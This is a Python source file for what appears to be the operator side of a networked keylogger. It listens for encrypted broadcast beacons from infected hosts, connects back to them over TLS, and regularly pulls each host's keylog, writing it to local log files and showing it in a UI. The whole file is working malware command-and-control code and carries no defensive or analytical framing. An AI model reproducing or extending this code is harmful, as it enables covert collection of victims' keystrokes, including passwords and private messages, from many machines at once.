import socket
from time import sleep
from threading import Thread
from shared import BD_PORT, HOST_PORT
import utils
import ssl
import sys
import os
from os import path
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP
from multiprocessing.pool import ThreadPool
from ui import Application


def fetch_file(host, on_file_fetched, update_hosts):
    """
    Fetch the keylog from a specified connected host

    Args:
        host: the IP of the host
        on_file_fetched: callback after fetching the file
        update_hosts: function to call to refresh the ui of the hosts in case the host disconnected
    """
    global hosts
    if host not in hosts.keys():
        return
    conn = hosts[host]
    try:
        utils.send_msg(conn, "send file")
        file = utils.recv_msg(conn)
        with open(host + ".log", "a", encoding="utf-8") as f:
            f.write(file)
        on_file_fetched(utils.Event(host=host, file=file))
    except (socket.timeout, socket.error):
        conn.close()
        del hosts[host]
        update_hosts(utils.Event(hosts=hosts.keys()))


def fetch_files(on_file_fetched, get_fetch_interval, update_hosts):
    """
    Fetches the keylogs from all connected hosts

    Args:
        on_file_fetched: callback after fetching the file
        get_fetch_interval: function to retriebe the specified interbal in the UI
        update_hosts: function to call to refresh the ui of the hosts in case the host disconnected
    """
    global hosts, pool
    while True:
        pool.map(lambda host: fetch_file(
            host, on_file_fetched, update_hosts), hosts.keys())
        sleep(get_fetch_interval())


def listen_to_hosts(update_hosts):
    """
    Listens for broadcasts made by clients and connects to them using its pribate key.

    Args:
        update_hosts: function to call to refresh the ui when connected to a new host
    """
    global cipher_rsa
    BDlistener = socket.socket(type=socket.SOCK_DGRAM)
    BDlistener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    BDlistener.bind(("", BD_PORT))
    while True:
        data, addr = BDlistener.recvfrom(4096)
        ip = addr[0]
        try:
            cipher_rsa.decrypt(data)
        except Exception as e:
            # wrong certificate
            continue
        if ip in hosts.keys():
            continue
        conn = socket.socket()
        utils.set_keepalive(conn)
        try:
            conn.connect((ip, HOST_PORT))
            conn = ssl.wrap_socket(
                sock=conn, certfile=CERT_FILE, keyfile=PRIVATE_KEY_FILE, server_side=True)
            hosts[ip] = conn
            update_hosts(utils.Event(hosts=hosts.keys()))
        except:
            conn.close()
    BDlistener.close()


if __name__ == "__main__":
    CERT_FILE = utils.resource_path("cert.pem")
    PRIVATE_KEY_FILE = utils.resource_path("key.pem")
    THREADS = 32

    private_key = RSA.import_key(open(PRIVATE_KEY_FILE).read())
    cipher_rsa = PKCS1_OAEP.new(private_key)
    hosts = {}
    pool = ThreadPool(processes=THREADS)
    
    app = Application(fetch_file)
    Thread(target=fetch_files, args=(app.on_file_fetched,
                                     app.get_interval, app.update_hosts), daemon=True).start()
    Thread(target=listen_to_hosts, args=(
        app.update_hosts,), daemon=True).start()
    app.mainloop()
